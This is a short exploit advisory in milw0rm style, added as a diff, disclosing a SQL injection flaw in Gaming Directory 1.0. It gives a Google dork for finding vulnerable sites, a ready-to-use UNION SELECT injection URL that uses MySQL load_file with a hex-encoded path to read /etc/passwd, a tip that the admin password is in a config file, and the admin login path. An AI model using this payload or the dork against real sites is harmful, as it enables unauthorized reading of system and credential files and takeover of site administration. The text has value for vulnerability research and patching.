@@ -1,0 +1,40 @@
+--==+================================================================================+==--
+--==+		    Gaming Directory 1.0 SQL Injection Vulnerbilitys	             +==--
+--==+================================================================================+==--
+
+
+
+Discovered By: t0pP8uZz
+Discovered On: 5 April 2008
+SITE: http://www.turnkeyzone.com/
+Google Dork: inurl:"directory.php?ax=list" gaming
+
+
+DESCRIPTION: 
+this popular gaming directory script is vulnerable due to insecure mysql querys.
+this allows the remote attacker to pull info from the database.
+
+The below Injection uses MYSQL's load_file function, since the admin area password is stored
+in a config file we can use load_file to to try and locate it and display the contents of the file. 
+certain permissons to the running db user is required for this to work. in the load_file below
+is a string that has been converted to HEX and if you can read hex then its /etc/passwd so this
+should load the /etc/passwd file on most linux distros. Remember certain permissions are needed.
+
+
+EXPLOITS:
+http://site.com/directory.php?ax=list&sub=6&cat_id=-1/**/UNION/**/ALL/**/SELECT/**/1,2,load_file(0x2F6574632F706173737764),4/**/FROM/**/links/*
+
+
+NOTE/TIP: 
+admin login is at /siteadmin/
+
+
+GREETZ: milw0rm.com, H4CK-Y0u.org, CipherCrew!
+
+
+
+--==+================================================================================+==--
+--==+		    Gaming Directory 1.0 SQL Injection Vulnerbilitys	             +==--
+--==+================================================================================+==--
+
+# milw0rm.com [2008-04-05]
